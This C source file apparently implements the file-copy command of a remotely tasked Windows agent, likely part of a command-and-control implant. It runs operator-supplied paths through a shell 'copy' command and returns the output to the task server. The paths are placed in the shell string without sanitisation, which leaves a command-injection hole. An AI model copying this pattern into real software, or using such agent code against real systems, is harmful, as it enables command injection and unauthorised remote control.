#define _WIN32_WINNT 0x0600
#include "commands.h"
#include "utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#ifdef INCLUDE_CMD_CP

void command_cp(char *task_id, char *params) {
  char src[MAX_PATH] = {0};
  char dst[MAX_PATH] = {0};

  if (params[0] == '{') {
    extract_json_string(params, "source", src, sizeof(src));
    extract_json_string(params, "destination", dst, sizeof(dst));
  }

  if (strlen(src) == 0 || strlen(dst) == 0) {
    send_task_response(task_id, "Error: source and destination required");
    return;
  }

  char cmd[MAX_PATH * 2 + 20];
  snprintf(cmd, sizeof(cmd), "copy /Y \"%s\" \"%s\"", src, dst);
  char *output = execute_shell(cmd);
  send_task_response(task_id, output);
  if (output)
    free(output);
}

#endif
